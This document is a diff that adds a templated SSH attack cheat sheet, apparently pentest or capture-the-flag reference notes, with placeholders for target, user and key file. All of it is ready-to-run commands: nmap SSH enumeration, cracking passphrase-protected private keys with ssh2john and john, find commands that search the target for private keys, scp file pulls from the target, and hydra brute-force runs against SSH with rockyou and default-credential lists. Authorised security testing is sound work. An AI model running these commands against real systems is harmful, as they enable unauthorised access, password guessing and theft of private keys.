@@ -1,0 +1,33 @@
+# === NMAP SSH SCRIPTS ===
+nmap -sV -p 22 --script=ssh-hostkey,ssh-auth-methods,ssh2-enum-algos,sshv1 {{TARGET}}
+
+# === MANUAL CONNECTION ===
+ssh {{USER}}@{{TARGET}}
+ssh {{USER}}@{{TARGET}} -p {{PORT}}
+# Accept any host key (lab use)
+ssh -o StrictHostKeyChecking=no {{USER}}@{{TARGET}}
+
+# === PRIVATE KEY AUTHENTICATION ===
+chmod 600 {{KEY_FILE}}
+ssh {{USER}}@{{TARGET}} -i {{KEY_FILE}}
+# Convert PuTTY key to OpenSSH
+puttygen {{KEY_FILE}} -O private-openssh -o id_rsa_converted
+
+# === CRACK PASSPHRASE-PROTECTED KEY ===
+ssh2john {{KEY_FILE}} > {{KEY_FILE}}.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt {{KEY_FILE}}.hash
+
+# === FIND KEYS ON TARGET ===
+find /home /root /opt -type f \( -name "id_rsa*" -o -name "id_ed25519*" -o -name "*.pem" \) 2>/dev/null
+find /etc/ssh -name "*.pub"
+
+# === FILE TRANSFER VIA SCP ===
+scp {{USER}}@{{TARGET}}:/path/to/file /tmp/
+scp -r {{USER}}@{{TARGET}}:/path/to/dir /tmp/
+scp /local/file {{USER}}@{{TARGET}}:/tmp/
+scp -i {{KEY_FILE}} {{USER}}@{{TARGET}}:/path/to/file /tmp/
+
+# === BRUTE FORCE ===
+hydra -l {{USER}} -P /usr/share/wordlists/rockyou.txt {{TARGET}} -t 4 ssh
+hydra -L users.txt -p {{PASS}} {{TARGET}} -t 4 ssh
+hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt {{TARGET}} ssh
